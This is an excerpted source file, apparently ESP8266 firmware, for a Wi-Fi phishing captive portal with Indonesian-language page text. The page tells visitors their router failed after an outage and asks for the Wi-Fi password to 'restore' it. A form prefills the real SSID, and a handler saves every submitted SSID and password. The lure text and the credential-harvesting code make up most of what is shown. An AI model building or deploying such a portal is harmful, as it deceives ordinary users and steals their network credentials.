...
#define SUBTITLE "Wifi Terkendala"
#define TITLE "Error!"
#define BODY "Mohon maaf, kami mendeteksi bahwa router anda mengalami kendala akibat pemadaman. Silahkan masukan password wifi untuk melakukan pemulihan."
#define POST_TITLE "Memproses..."
#define POST_BODY "Kami sedang melakukan perbaikan. Silakan Tunggu beberapa menit.</br>Terima kasih."
...
String footer() { return 
  "</div><div class=q><a>Hubungi Administrator untuk informasi lebih lanjut.</a></div>";
}
...
String header(String t) {
  ...
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    ...
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding-left: 0.2em; color:red; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: red; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>SSID:</b> <center><input type=text name=ssid value='"+SSID_NAME+"' readonly></input></center>" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Pulihkan\"></form></center>" + footer();
}
...
String posted() {
  ...
  Credentials = data + "<li>SSID: <b>" + ssid + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
